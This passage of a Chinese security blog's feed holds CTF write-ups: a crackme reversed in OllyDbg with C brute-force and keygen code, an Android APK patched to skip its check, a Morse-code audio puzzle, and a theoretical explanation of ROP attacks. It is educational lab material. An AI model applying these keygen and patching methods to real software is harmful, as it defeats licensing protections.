    <link href="http://spd.dropsec.xyz/2016/12/05/2016%E9%97%AE%E9%BC%8E%E6%9D%AF-6-2/"/>
    <id>http://spd.dropsec.xyz/2016/12/05/2016问鼎杯-6-2/</id>
    <published>2016-12-05T15:43:52.000Z</published>
    <updated>2017-04-07T08:52:59.497Z</updated>
    
    <content type="html"><![CDATA[<p>这道题算是这学期遇到的最经典的creackme了，很有必要仔细分析一下。它给出的是一个exe可执行文件和一份readme.text文件，首先我们看一下，它们的内容。一份readme描述了具体的问题,它也给出了半个用户名，然后提示暴力循环6分钟用i5处理器跑的话，但是到最后你会发现这明显有点扯淡，我们逆向分析出算法后给它1秒跑出来。<br><a id="more"></a><br><img src="http://oeiu48wqi.bkt.clouddn.com/201612180.png" alt=""></p>
<p>我们再尝试一下这个exe可执行文件，输入一个错误用户名，和序列号后提示错误。<br><img src="http://oeiu48wqi.bkt.clouddn.com/201612181.png" alt=""><br>了解了这些信息后我们开始对它开刀，首先用PEID查看，发现没有加壳。扔进OD后直接查找关键字符串，下好断点，就是下图中箭头所指的位置。<br><img src="http://oeiu48wqi.bkt.clouddn.com/201612183.png" alt=""><br>然后我们run一下断在了输用户名和序列号的位置，输入错误的用户名和正确的序列号，发现它在了Sorry~这个位置，我们看到了它的函数调用线，我们沿着这条线倒跟踪上去。<br><img src="http://oeiu48wqi.bkt.clouddn.com/201612184.png" alt=""></p>
<p>倒跟踪到函数调用线的初始位置后，我们在初始位置尽量上方的位置下一个断点，然后重新载入，回到这个断点处，我们单步跟踪。我们慢慢发现movsv eax,byte ptr ds:[esi+0x1]和movsv edx,byte ptr ds:[edx]这两条指令分别获取了我们输入的用户名的第一个字符和第二个字符，然后传入crackme.000B1F30这个函数。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612185.png" alt=""></p>
<p>我们进入这个函数后发现这个crackme.000B1F30就是计算serial序列号的关键函数。接下了就是对serial算法进行分析，首先这个函数把传进来的两个参数做各种运算然后生成了5个数字，具体看做的注释。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612186.png" alt=""><br><img src="http://oeiu48wqi.bkt.clouddn.com/201612187.png" alt=""></p>
<p>在这里我们可以看到程序已经在保存生成的数据了，而且每一个数据下面都有一个比较，如果不对就直接跳转到Sorry~。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612188.png" alt=""><br><img src="http://oeiu48wqi.bkt.clouddn.com/201612189.png" alt=""><br>接下来我们根据serial算法的汇编代码还原出C代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">void decode(int forward, int back)&#123; </div><div class="line">      //int i;</div><div class="line">      int local1, local2, local3, local4, local5 = 0;//, eax, ecx, ebx;</div><div class="line">      int result[] = &#123;0&#125;;</div><div class="line">      </div><div class="line">     local3 = (forward &amp; 1) + 6 + ((back &gt;&gt; 2 ) &amp; 1);</div><div class="line">     result[0] = local3;</div><div class="line">     local4 = ((forward &gt;&gt; 3)&amp; 1)+6+((back &gt;&gt; 3) &amp; 1);</div><div class="line">     result[1] = local4;</div><div class="line">     local1 = ((forward &gt;&gt; 1) &amp; 1)+6 + ((back &gt;&gt; 4) &amp; 1);</div><div class="line">     result[2] = local1;</div><div class="line">     local2 = (back &amp; 1 )+6+((forward&gt;&gt;2)&amp;1);</div><div class="line">     result[3] = local2;</div><div class="line">     local5 = ((back &gt;&gt; 1) &amp; 1)+6+((forward &gt;&gt; 4) &amp; 1);</div><div class="line">     result[4] = local5;</div><div class="line">	</div><div class="line">     printf(&quot;%d%d%d%d%d &quot;, result[0], result[1], result[2], result[3], result[4]);</div><div class="line">  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>根据提示，其他位的范围为26个小写字母和下划线，我们写出爆破程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">#include&quot;stdafx.h&quot;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include &lt;ctype.h&gt;</div><div class="line"></div><div class="line">char result[5];</div><div class="line">void decode(int forward, int back)&#123;</div><div class="line">	</div><div class="line">	int local1, local2, local3, local4, local5 = 0;//, eax, ecx, ebx;</div><div class="line">	local3 = (forward &amp; 1) + 6 + ((back &gt;&gt; 2) &amp; 1);</div><div class="line">	itoa(local3, &amp;result[0], 10);</div><div class="line">	local4 = ((forward &gt;&gt; 3) &amp; 1) + 6 + ((back &gt;&gt; 3) &amp; 1);</div><div class="line">	itoa(local4, &amp;result[1], 10);</div><div class="line">	local1 = ((forward &gt;&gt; 1) &amp; 1) + 6 + ((back &gt;&gt; 4) &amp; 1);</div><div class="line">	itoa(local1, &amp;result[2], 10);</div><div class="line">	local2 = (back &amp; 1) + 6 + ((forward &gt;&gt; 2) &amp; 1);</div><div class="line">	itoa(local2, &amp;result[3], 10);</div><div class="line">	local5 = ((back &gt;&gt; 1) &amp; 1) + 6 + ((forward &gt;&gt; 4) &amp; 1);</div><div class="line">	itoa(local5, &amp;result[4], 10);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line"></div><div class="line">	char tag[] = &quot;abcdefghijklmnopqrstuvwxyz_&quot;;</div><div class="line">	char flag[] = &quot;&#123;hdu*b***0_&#125;&quot;;</div><div class="line"></div><div class="line">	int number[] = &#123;4, 6, 7, 8 &#125;;</div><div class="line">	char fact[6][6] = &#123; &quot;87788&quot;, &quot;66867&quot;, &quot;66777&quot;, &quot;86767&quot;&#125;;</div><div class="line">	for (int i = 0; i &lt; sizeof(number)/sizeof(number[0]); i++) &#123;</div><div class="line">		for (int j = 0; j &lt; strlen(tag); j++) &#123;</div><div class="line">			int n = number[i];</div><div class="line">			flag[n] = tag[j];</div><div class="line">			decode(flag[n-1], flag[n]);</div><div class="line">			if (strcmp(result,fact[i]) == 0) &#123;</div><div class="line">				printf(&quot;%s\n&quot;, flag);</div><div class="line">				break;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	system(&quot;pause&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跑出的结果为<code>{hdu_bav0_}</code>。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016121810.png" alt=""></p>
<p>我们在creakme中试一下结果正确。<br><img src="http://oeiu48wqi.bkt.clouddn.com/2016121811.png" alt=""><br>好吧，既然注册算法都有了，那我们顺便把注册机也写出来吧，这样就可以拿着玩了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line"></div><div class="line">void decode(int forward, int back)&#123; </div><div class="line">      //int i;</div><div class="line">      int local1, local2, local3, local4, local5 = 0;//, eax, ecx, ebx;</div><div class="line">      int result[] = &#123;0&#125;;</div><div class="line">      </div><div class="line">     local3 = (forward &amp; 1) + 6 + ((back &gt;&gt; 2 ) &amp; 1);</div><div class="line">     result[0] = local3;</div><div class="line">     local4 = ((forward &gt;&gt; 3)&amp; 1)+6+((back &gt;&gt; 3) &amp; 1);</div><div class="line">     result[1] = local4;</div><div class="line">     local1 = ((forward &gt;&gt; 1) &amp; 1)+6 + ((back &gt;&gt; 4) &amp; 1);</div><div class="line">     result[2] = local1;</div><div class="line">     local2 = (back &amp; 1 )+6+((forward&gt;&gt;2)&amp;1);</div><div class="line">     result[3] = local2;</div><div class="line">     local5 = ((back &gt;&gt; 1) &amp; 1)+6+((forward &gt;&gt; 4) &amp; 1);</div><div class="line">     result[4] = local5;</div><div class="line">	</div><div class="line">     printf(&quot;%d%d%d%d%d &quot;, result[0], result[1], result[2], result[3], result[4]);</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char str1[12];</div><div class="line">	int len;</div><div class="line">	printf(&quot;input your username:\n&quot;);</div><div class="line">	scanf(&quot;%s&quot;,&amp;str1);</div><div class="line">	len=strlen(str1);</div><div class="line">	if(len&gt;12)</div><div class="line">	&#123;</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line">	int i=0;</div><div class="line">	int forward;</div><div class="line">	int back;</div><div class="line">	 printf(&quot;serial:\n&quot;);</div><div class="line">	for(i;i&lt;len-1;i++)</div><div class="line">	&#123;</div><div class="line">		forward=str1[i];</div><div class="line">		back=str1[i+1];</div><div class="line">	    decode(forward,back);</div><div class="line">	&#125;</div><div class="line">	system(&quot;pause&quot;);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>测试一下,成功。想要学习的伙伴们可以在我的github中的CTF仓库中找到这个题。<br><img src="http://oeiu48wqi.bkt.clouddn.com/2016121812.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这道题算是这学期遇到的最经典的creackme了，很有必要仔细分析一下。它给出的是一个exe可执行文件和一份readme.text文件，首先我们看一下，它们的内容。一份readme描述了具体的问题,它也给出了半个用户名，然后提示暴力循环6分钟用i5处理器跑的话，但是到最后你会发现这明显有点扯淡，我们逆向分析出算法后给它1秒跑出来。&lt;br&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2016问鼎杯-4-1</title>
    <link href="http://spd.dropsec.xyz/2016/12/05/2016%E9%97%AE%E9%BC%8E%E6%9D%AF-4-1/"/>
    <id>http://spd.dropsec.xyz/2016/12/05/2016问鼎杯-4-1/</id>
    <published>2016-12-05T14:10:06.000Z</published>
    <updated>2017-04-07T08:52:13.367Z</updated>
    
    <content type="html"><![CDATA[<p>拿到这道题是个压缩包，解压后得到一个app-release.apk。我们安装到安卓模拟器测试一下，发现让我们输入随机码，下面显示“您的随机码为：xxxxxx”,这个随机码变化很快，手动输入下面的随机码有点不可能，我们随便输入一个随机码点击提交后显示input is wrong。<br><a id="more"></a><br><img src="http://oeiu48wqi.bkt.clouddn.com/20161261.png" alt=""><br>我们用Android Killer进行逆向分析。首先查看伪代码，我们发现在onClick下有一个if判断，getText()获得我们输入的随机码然后和OneActtivity类中的valuel值进行比较，如果相等则输出flag，如果错误则输出“Input is wrong”。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161262.png" alt=""><br>我们可以直接修改If条件让它输出flag,不过先不急，我们分析一下它的flag是如何产生的。我们看到flag就是theFlag()的返回值作为getContent()的参数，然后求getContent()的hashCode,接着将hashCode转化为字符型就是flag。但是这里还有一个坑，它将flag用setTransformationMethod（）进行了隐藏。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161263.png" alt=""><br>下面是getContent()和theFlag的具体功能，theFlag()获得包名，然后getContent()获得版本号后加233赋值给i，返回结果为i,也就是flag就是i的shahCode。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161264.png" alt=""><br>接下来我们进行破解，这里就是if语句对应的Dalvik汇编代码，我们直接删掉。也就是不用进行判断我们输入的随机码是否与程序生成的随机码相同直接执行输出flag的语句。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161265.png" alt=""><br>这里是setTransformationMethod（）对应的Dalvik汇编代码，我们直接删掉，要不它会隐藏我们的flag。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161266.png" alt=""><br>重新编译签名后，在安卓虚拟机上运行，随便填写验证码，点击提交后我们得到flag。<br><img src="http://oeiu48wqi.bkt.clouddn.com/20161267.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿到这道题是个压缩包，解压后得到一个app-release.apk。我们安装到安卓模拟器测试一下，发现让我们输入随机码，下面显示“您的随机码为：xxxxxx”,这个随机码变化很快，手动输入下面的随机码有点不可能，我们随便输入一个随机码点击提交后显示input is wrong。&lt;br&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2016问鼎杯-6-1</title>
    <link href="http://spd.dropsec.xyz/2016/12/05/2016%E9%97%AE%E9%BC%8E%E6%9D%AF-6-1/"/>
    <id>http://spd.dropsec.xyz/2016/12/05/2016问鼎杯-6-1/</id>
    <published>2016-12-05T13:35:35.000Z</published>
    <updated>2017-04-07T08:52:29.729Z</updated>
    
    <content type="html"><![CDATA[<p>拿到这道题的文件，是个压缩包，解压后得到一个secret.data的二进制文件。没见过以.data开头的文件，经过百度得知data是在各种系统、程序中，都会有很多自定义的文件名、文件扩展名。无论data文件指的是文件名data还是扩展名data，都是系统或程序自定义的数据文件。data是数据保存的备份类文件，一般可以用meidaplayer、记事本或word打开。如果是：<br><a id="more"></a><br>　　1. 数据文件， 可以用txt或word直接打开<br>　　2. vcd格式的影音文件，可以用meidaplayer打开！</p>
<p>根据题目提示“听听听”，我们可以确定secret.data是vcd格式的音频文件。于是我们把它的后缀改成.dat。</p>
<ol>
<li>用任意的VCD播放器打开，看能不能听到flag,结果显示无效。好吧是我太天真了。</li>
<li>用Cool edit打开，它是一款功能强大、效果出色的多轨录音和音频处理软件。打开后我们看到它的波形振幅怎么这么像福尔摩斯电码，没错就是福尔摩斯电码！</li>
</ol>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/20161260.png" alt=""><br>我们根据福尔摩斯密码对照表得到THESECRETWDFLAGISMORESCODE1SFUN，即flag是MORESCODE1SFUN。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿到这道题的文件，是个压缩包，解压后得到一个secret.data的二进制文件。没见过以.data开头的文件，经过百度得知data是在各种系统、程序中，都会有很多自定义的文件名、文件扩展名。无论data文件指的是文件名data还是扩展名data，都是系统或程序自定义的数据文件。data是数据保存的备份类文件，一般可以用meidaplayer、记事本或word打开。如果是：&lt;br&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ROP系统攻击思想</title>
    <link href="http://spd.dropsec.xyz/2016/12/02/ROP%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E6%80%9D%E6%83%B3/"/>
    <id>http://spd.dropsec.xyz/2016/12/02/ROP系统攻击思想/</id>
    <published>2016-12-02T06:12:04.000Z</published>
    <updated>2017-04-07T09:07:44.016Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-题记"><a href="#0x00-题记" class="headerlink" title="0x00 题记"></a>0x00 题记</h3><p>学习pwn时总是接触到Rop技术，看别人的writeup很是吃力，别人的文章中也只是简单的提了一下，但是具体什么是Rop,它的利用原理和思想是什么我都不得而知。现在我经过查找相关的资料后终于对其有了更深入的理解。ROP全称为Retrun-oriented Programmming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。下面我们进行具体说明。<br><a id="more"></a></p>
<h3 id="0x01-不得不提的return-to-libc"><a href="#0x01-不得不提的return-to-libc" class="headerlink" title="0x01 不得不提的return-to-libc"></a>0x01 不得不提的return-to-libc</h3><p>要学习Rop技术我们首先要了解一下return-to-libc,它是通过利用 已有代码 ，如libc库函数中的代码，实施攻击 。攻击者通过栈溢出，覆盖正常函数栈中的返回地址，使恶意调用的函数的参数覆盖栈中返回地址邻近区域的内存空间，然后函数调用返回时，会去执行libc中的攻击者制定的函数，如使用sys-tern(),执行shell。值得强调的是不但攻击者恶意调用和libc中的代码可以被使用，任何可执行的代码都有可能被攻击。return-to-libc技术虽然使得攻击者绕过了基于w o X等技术的防护措施 ，但是与基于代码注入的攻击相比，还是受很大限制。其一 ，在 retum-tc~libc中，被恶意调用的函数的执行顺序只能是线性的，不能使用分支或者跳转，而恶意注入代码并无此限制；其二 ，恶意调用的函数只能是程序的代码段或者加载的库中可用的函数 ，如果去掉某些危险 的库 函数 ，将很大程度上限制攻击者的攻击能力 。因而 ，w o X技术某种程度上也限制了攻击者的能力。在此 基础上提出了 Retum-OrientedProgramming(ROP)的 方法 。即通过使用已有的程序库，包括 libc、驱动程序等可执行的代码片段 ，构建图灵完备的程序，达到攻击程序的正常控制流程 、提升攻击者操作权限甚至完全获取计算机控制权的目的。ROP不同于 retum-to-libc攻击之处在于，R0P攻击利用以ret指令结尾的函数代码片段 ，而不是整个函数本身去完成预定的操作 。从 广义角度讲，return-to-libc攻击是 ROP攻击的特例 。</p>
<h3 id="0x02-Rop思想"><a href="#0x02-Rop思想" class="headerlink" title="0x02 Rop思想"></a>0x02 Rop思想</h3><p>ROP的思想是攻击者扫描已有的动态链接库和可执行文件，提取出可以利用的指令片段(gadget) ,例如加法 运算 ，称之为gadget。这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。操作系统通过栈来进行函数的调用和返回。函数的调用和返回就是通过压栈和出栈来实现的。每个程序都会维护一个程序运行栈，栈为所有函数共享，每次函数调用，系统会分配一个栈桢给当前被调用函数，用于参数的传递、局部变量的维护、返回地址的填入等。栈帧是程序运行栈的一部分 ，在Linux中 ，通过%esp和 %ebp寄存器维护栈顶指针和栈帧的起始地址 ，%eip是程序计数器寄存器[1]  。而ROP攻击则是利用以ret结尾的程序片段 ，操作这些栈相关寄存器，控制程的流程，执行相应的gadget，实施攻击者预设目标 。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-题记&quot;&gt;&lt;a href=&quot;#0x00-题记&quot; class=&quot;headerlink&quot; title=&quot;0x00 题记&quot;&gt;&lt;/a&gt;0x00 题记&lt;/h3&gt;&lt;p&gt;学习pwn时总是接触到Rop技术，看别人的writeup很是吃力，别人的文章中也只是简单的提了一下，但是具体什么是Rop,它的利用原理和思想是什么我都不得而知。现在我经过查找相关的资料后终于对其有了更深入的理解。ROP全称为Retrun-oriented Programmming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。下面我们进行具体说明。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="ROP" scheme="http://spd.dropsec.xyz/tags/ROP/"/>
    
  </entry>
  
</feed>
